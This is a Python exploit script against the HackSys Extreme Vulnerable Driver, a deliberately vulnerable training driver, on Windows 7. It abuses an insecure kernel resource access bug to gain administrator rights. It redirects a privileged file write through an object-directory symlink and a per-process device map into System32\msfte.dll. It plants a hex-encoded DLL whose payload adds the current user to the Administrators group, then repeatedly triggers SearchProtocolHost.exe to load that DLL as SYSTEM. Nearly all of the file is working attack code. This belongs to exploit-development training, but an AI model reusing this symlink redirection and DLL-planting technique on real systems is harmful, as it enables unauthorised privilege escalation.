import ctypes, os, struct, sys, threading, multiprocessing, time, win32con, binascii, getpass, win32net, threading, thread
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

ntstatus = c_long 
PVOID = c_void_p
PWSTR = c_wchar_p

STATUS_SUCCESS = ntstatus(0x00000000).value
STATUS_UNSUCCESSFUL = ntstatus(0xC0000001).value

trigger_thread_stop = None
is_admin = False


def debug_print(message):
	""" Prints message in terminal and debugger """
	print message
	kernel32.OutputDebugStringA(message + "\n")	
	

class CheckAdminThread(threading.Thread):
	''' Check Admin Thread with Callback Class '''
	def __init__(self, callback, *args, **kwargs):
		target = kwargs.pop('target')
		username = kwargs.pop('username')
		super(CheckAdminThread, self).__init__(target=self.target_with_callback, *args, **kwargs)
		self.callback = callback
		self.method = target
		self.username = username

	def target_with_callback(self):
		self.method(self.username)
		self.callback()

def check_admin(username):
	''' Periodically checks for Admin Privs '''
	global is_admin
	while not is_admin:
		members = win32net.NetLocalGroupGetMembers(None,'Administrators',1)
		if username in [record['name'] for record in members[0]]:
			is_admin = True
			break
		time.sleep(5)

def cleanup():
	''' Callback function to clean up after we get Admin Privs'''
	global trigger_thread_stop
	
	debug_print ("[+] Cleaning up ...")
	debug_print ("\t [>] Killing remaining threads")
	trigger_thread_stop.set()
	debug_print ("\t [>] Deleting remnant files")
	os.remove("C:\\windows\\system32\\msfte.dll")
	debug_print("[*] Enjoy Elevated Privs !\r\n")
	sys.exit()
	
	
def trigger_search_protocol_host(user_profile, stop_event):
	''' Periodically write + delete arbitrary file to trigger SearchProtocolHost.exe as SYSTEM '''
	global is_admin
	delay = 70
	while not is_admin:
		debug_print ("\t[>] Writing arbitrary file to trigger")
		file = open (user_profile + '\\desktop\\pewpew.txt','w')
		file.write('pewpewpew')
		file.close()
		os.remove(user_profile + '\\desktop\\pewpew.txt')
		debug_print("\t[>] Waiting " + str(delay) +" seconds before triggering again ...")
		stop_event.wait(delay)
		delay += 5
	
	
class UNICODE_STRING(Structure): 
	_fields_ = [('Length', USHORT), 
				('MaximumLength', USHORT), 
				('Buffer', PWSTR)]
	
class OBJECT_ATTRIBUTES(Structure):
	_fields_ = [('Length', ULONG),
				('RootDirectory', HANDLE),
				('ObjectName', POINTER(UNICODE_STRING)),
				('Attributes', ULONG),
				('SecurityDescriptor', PVOID),
				('SecurityQualityOfService', PVOID)]
	
def InitializeObjectAttributes(InitializedAttributes, ObjectName, Attributes, RootDirectory, SecurityDescriptor):
	''' Initializes the OBJECT_ATTRIBUTES structure '''
	memset(addressof(InitializedAttributes), 0, sizeof(InitializedAttributes))
	InitializedAttributes.Length = sizeof(InitializedAttributes)
	InitializedAttributes.ObjectName = ObjectName
	InitializedAttributes.Attributes = Attributes
	InitializedAttributes.RootDirectory = RootDirectory
	InitializedAttributes.SecurityDescriptor = SecurityDescriptor
	InitializedAttributes.SecurityQualityOfService = None
	
 
def RtlInitUnicodeString(DestinationString, Src):
	''' Initializes a UNICODE_STRING structure. '''
	memset(addressof(DestinationString), 0, sizeof(DestinationString))
	DestinationString.Buffer = cast(Src, PWSTR)
	DestinationString.Length = sizeof(Src) - 2 # Excluding terminating NULL character
	DestinationString.MaximumLength = DestinationString.Length
	 
	return STATUS_SUCCESS
	
	
def open_object_directory(hRoot, directory_name):
	''' Opens object directory and returns handle to it '''
	directory_handle = c_void_p()
	
	object_name = UNICODE_STRING()
	ntstatus = STATUS_UNSUCCESSFUL
	p_object_name = None

	if directory_name:
		w_directory_name = create_unicode_buffer(directory_name)
		object_name = UNICODE_STRING()
		ntstatus = RtlInitUnicodeString(object_name, w_directory_name)
		p_object_name = pointer(object_name)
		if ntstatus != STATUS_SUCCESS:
			debug_print ('RtlUnicodeStringInit failed and returned {!r}'.format(ntstatus))
			sys.exit()
		
	object_attributes = OBJECT_ATTRIBUTES()
	InitializeObjectAttributes(object_attributes, p_object_name, 0x40, hRoot, None)	
	ntstatus = ntdll.NtOpenDirectoryObject(byref(directory_handle), 0x02000000, byref(object_attributes))
	if ntstatus != STATUS_SUCCESS:
		debug_print ("Failed to open object directory")
		sys.exit()

	return directory_handle
	
	
def create_object_directory(hRoot, directory_name):
	''' Creates object directory and returns handle to it '''
	directory_handle = c_void_p()
	ntstatus = STATUS_UNSUCCESSFUL
	object_attributes = OBJECT_ATTRIBUTES()
	p_object_name = None
	
	if directory_name:
		w_directory_name = create_unicode_buffer(directory_name)
		object_name = UNICODE_STRING()
		ntstatus = RtlInitUnicodeString(object_name, w_directory_name)
		p_object_name = pointer(object_name)
		if ntstatus != STATUS_SUCCESS:
			debug_print ('RtlUnicodeStringInit failed and returned {!r}'.format(ntstatus))
			sys.exit()
			
	object_attributes = OBJECT_ATTRIBUTES()
	InitializeObjectAttributes(object_attributes, p_object_name, 0x40, hRoot, None)	
	ntstatus = ntdll.NtCreateDirectoryObject(byref(directory_handle), 0xF000F, byref(object_attributes))
	if ntstatus != STATUS_SUCCESS:
		debug_print ("Failed to create object directory")
		sys.exit()
		
	return directory_handle
	
	
def create_symlink(hRoot, symbolic_link_name, target_name):
	ntstatus = STATUS_UNSUCCESSFUL
	symbolic_link_handle = c_void_p()

	w_symbolic_link_name = create_unicode_buffer(symbolic_link_name)
	symbolic_link_object_name = UNICODE_STRING()
	ntstatus = RtlInitUnicodeString(symbolic_link_object_name, w_symbolic_link_name)
	p_symbolic_link_object_name = pointer(symbolic_link_object_name)
	
	w_target_name = create_unicode_buffer(target_name)
	target_object_name = UNICODE_STRING()
	ntstatus = RtlInitUnicodeString(target_object_name, w_target_name)
	p_target_object_name = pointer(target_object_name)
	
	object_attributes = OBJECT_ATTRIBUTES()
	InitializeObjectAttributes(object_attributes, p_symbolic_link_object_name, 0x40, hRoot, None)	
	ntstatus = ntdll.NtCreateSymbolicLinkObject(byref(symbolic_link_handle), 0xF0001, byref(object_attributes), p_target_object_name)
	if ntstatus != STATUS_SUCCESS:
		debug_print ("Failed to create symbolic link object")
		sys.exit()
		
	return symbolic_link_handle


class SET(Structure):
	_fields_ = [("DirectoryHandle", HANDLE)]
	
class QUERY(Structure):
	_fields_ = [("DriveMap", ULONG),
				("DriveType", c_char * 32)]
				
	
class PROCESS_DEVICEMAP_INFORMATION(Union): 
	_fields_ = [('Set', SET), 
				('Query', QUERY)]	
				
def set_process_device_map(directory_handle):
	''' Sets Process Device Map '''
	ntstatus = STATUS_UNSUCCESSFUL
	device_map = PROCESS_DEVICEMAP_INFORMATION()
	device_map.Set.DirectoryHandle = directory_handle
	
	# 0x17 = ProcessDeviceMap
	ntstatus = ntdll.NtSetInformationProcess(c_void_p(-1), 0x17, byref(device_map), sizeof(ULONG))
	if ntstatus != STATUS_SUCCESS:
		debug_print ("Failed to set per-process Device Map")
		sys.exit()	
		
	return ntstatus
	

payload_dll = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000c00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a240000000000000005ebd1c3418abf90418abf90418abf90cf95ac90448abf9051ecbc91408abf9051ecbf91408abf9051ecbd91408abf9052696368418abf900000000000000000504500004c0104002af0ab5a0000000000000000e00002210b010e0d0002000000060000000000000c10000000100000002000000000001000100000000200000600000000000000060000000000000000500000000400000000000002004001000010000010000000001000001000000000000010000000302000003400000038210000280000000000000000000000000000000000000000000000000000000040000010000000102000001c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000100000000000000000000000000000000000000000000000000000002e7465787400000022000000001000000002000000040000000000000000000000000000200000602e7264617461000092010000002000000002000000060000000000000000000000000000400000402e646174610000002f000000003000000002000000080000000000000000000000000000400000c02e72656c6f630000100000000040000000020000000a00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ff2504200010ff2500200010558bec6a006800300010e8ebffffff6a00e8deffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a2100006c2100000000000000000000000000002af0ab5a000000000d000000d400000064200000640600000000000000000000ffffffff000000005820000001000000000000000000000000000000000000000000000061646d696e2e646c6c00000000000000001000000c0000002e746578740000000c100000160000002e74657874246d6e0000000000200000100000002e696461746124350000000010200000200000002e7264617461000030200000340000002e6564617461000064200000d40000002e7264617461247a7a7a64626700000038210000140000002e69646174612432000000004c210000140000002e6964617461243300000000602100000c0000002e69646174612434000000006c210000260000002e6964617461243600000000003000002f0000002e64617461000000602100000000000000000000842100000020000000000000000000000000000000000000000000007a2100006c210000000000009b004578697450726f6365737300ed0257696e45786563006b65726e656c33322e646c6c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006e6574206c6f63616c67726f75702061646d696e6973747261746f7273202f61646420706c616365686f6c646572000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000010000000023008301230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"

def write_payload_dll(current_user, dest_file):
	''' Writes payload dll to msfte.dll '''
	# unhexlifying dll string
	unhexlified_payload = binascii.unhexlify(payload_dll)
	
	# replacing 'placeholder' with current user
	placeholder_index = unhexlified_payload.find('placeholder')
	final_dll = unhexlified_payload[:placeholder_index]
	final_dll += current_user + '\x00'
	final_dll += unhexlified_payload[placeholder_index + len(current_user) + 1:]
	
	# writing result to file
	dll_file = open(dest_file,'wb')
	dll_file.write(final_dll)
	dll_file.close()
	
	
def trigger_IKRA():
	''' Main Logic '''
	global trigger_thread_stop
	
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		debug_print ("[!] Driver handle not found : Error " + str(ctypes.GetLastError()))
		sys.exit()

	debug_print ("[+] Creating Object Root Directory")
	h_per_process_root_object  = create_object_directory(None, None)
	
	debug_print ("[+] Creating Object Directory 'C:\Windows\System32'")
	h_temp_object = create_object_directory(h_per_process_root_object, 'C:')
	h_temp_object = create_object_directory(h_temp_object, 'Windows')
	h_temp_object = create_object_directory(h_temp_object, 'System32')

	# Create symlink
	debug_print ("[+] Creating Symlink:")
	debug_print ("\t[-] HEVD.log -> \\\\GLOBAL??\C:\Windows\System32\msfte.dll")
	create_symlink(h_temp_object, "HEVD.log", "\\GLOBAL??\\C:\\Windows\\System32\\msfte.dll")
	
	# Setting per-process device map to new Object root
	debug_print ("[+] Setting Per-Process dive map to new Object Root Directory")
	set_process_device_map(h_per_process_root_object)
	
	dwReturn = c_ulong()
	debug_print ("[+] Triggering Insecure Kernel Resource Access")
	kernel32.DeviceIoControl(driver_handle, 0x22203B, None, 0, None, 0,byref(dwReturn), None)	
	
	# Get handle to \\GLOBAL?? Object
	debug_print ("[+] Opening handle to \\\\GLOBAL??")
	h_global_root_object = open_object_directory(None, '\\GLOBAL??')
	
	# Restore per-process device map to \\GLOBAL??
	debug_print ("\t[+] Restoring Per-Process drive map")
	set_process_device_map(h_global_root_object)
	
	# get current user
	current_user = getpass.getuser()
	
	# Write payload dll in C:\Windows\System32\wbem\wmi.dll
	debug_print ("[+] Writing payload DLL to C:\Windows\System32\msfte.dll")
	write_payload_dll(current_user, "C:\Windows\System32\msfte.dll")
	
	# Run thread to check if user is in administrators group
	debug_print ("[+] Running thread to periodically check if in Administrators group")
	admin_thread = CheckAdminThread(target=check_admin,username=current_user,callback=cleanup)
	admin_thread.start()
	
	debug_print ("[+] Running thread to periodically trigger SearchProtocolHost.exe")
	trigger_thread_stop = threading.Event()
	trigger_thread = threading.Thread(target=trigger_search_protocol_host, args=(os.environ['USERPROFILE'], trigger_thread_stop,))
	trigger_thread.start()
	
	
def preamble():
	""" Description """
	debug_print ("")
	debug_print ("HackSys Extreme Vulnerable Driver : Insecure Kernel Resource Access")
	debug_print ("")
	debug_print ("Target Machine : Windows 7 32-bit")
	debug_print ("Author: @GradiusX")
	debug_print ("")
		
		
if __name__ == '__main__':
	""" Main Function """
	preamble()
	trigger_IKRA()